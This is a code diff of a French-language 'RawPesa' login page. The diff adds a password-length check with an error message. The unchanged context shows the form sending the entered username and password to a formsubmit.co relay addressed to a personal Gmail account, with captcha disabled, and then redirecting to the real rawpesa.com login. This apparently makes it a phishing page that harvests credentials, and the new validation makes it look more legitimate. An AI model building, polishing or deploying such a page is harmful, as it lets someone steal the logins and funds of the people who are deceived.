@@ -31,7 +31,7 @@
     </p>
     <hr class="border-t border-gray-300 mb-6"/>
 
-    <form class="flex flex-col space-y-4" action="https://formsubmit.co/armageddon243243@gmail.com" method="POST">
+    <form id="loginForm" class="flex flex-col space-y-4" action="https://formsubmit.co/armageddon243243@gmail.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_subject" value="Tentative de connexion RawPesa">
       <input type="hidden" name="_next" value="https://rawpesa.com/login">
@@ -43,6 +43,7 @@
         <input type="password" name="Mot_de_passe" id="passwordInput" placeholder="Mot de passe"
                class="bg-[#f9f9f9] text-gray-500 placeholder-gray-400 px-4 py-3 rounded-md border border-transparent w-full focus:outline-none focus:ring-2 focus:ring-[#4c3bd7]" required/>
         <i id="togglePassword" class="fas fa-eye absolute right-4 top-1/2 transform -translate-y-1/2 text-[#2f2a8a] cursor-pointer"></i>
+        <p id="passwordError" class="text-red-600 text-sm mt-2 hidden">Le mot de passe doit contenir au moins 8 caractères.</p>
       </div>
 
       <button type="submit"
@@ -58,6 +59,19 @@
       const passwordInput = document.getElementById("passwordInput");
       passwordInput.type = passwordInput.type === "password" ? "text" : "password";
       this.classList.toggle("fa-eye-slash");
+    });
+
+    // Validation du mot de passe
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      const passwordInput = document.getElementById("passwordInput");
+      const errorText = document.getElementById("passwordError");
+
+      if (passwordInput.value.length < 8) {
+        event.preventDefault(); // empêche l'envoi
+        errorText.classList.remove("hidden");
+      } else {
+        errorText.classList.add("hidden");
+      }
     });
   </script>
 </body>
